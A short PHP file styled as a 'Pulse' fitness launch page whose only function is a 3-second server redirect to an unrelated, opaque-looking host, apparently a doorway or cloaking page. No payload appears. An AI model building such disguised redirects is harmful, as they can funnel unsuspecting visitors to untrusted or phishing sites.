<?php
header("Refresh: 3; URL=https://u987.lionich.com/MCz30/");
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="description" content="Biggest launch ever! Thousands of workouts.">
    <meta name="keywords" content="Pulse Gym, Pulse Fitness, Pulse Workouts">
    <title>Pulse - Fitness for the Future</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f0f0f0;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            justify-content: center;
            height: 100vh;
        }
        .loader {
            width: 120px;
            height: 40px;
            background: linear-gradient(to right, #0078d4, #0078d4 50%, transparent 50%, transparent);
            background-size: 200% 100%;
            animation: loading 1.5s infinite;
        }

        @keyframes loading {
            0% {
                background-position: 200% 0;
            }
            100% {
                background-position: -200% 0;
            }
        }

        p {
            font-size: 18px;
            color: #666;
        }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Redirecting...</p>
</body>
</html>
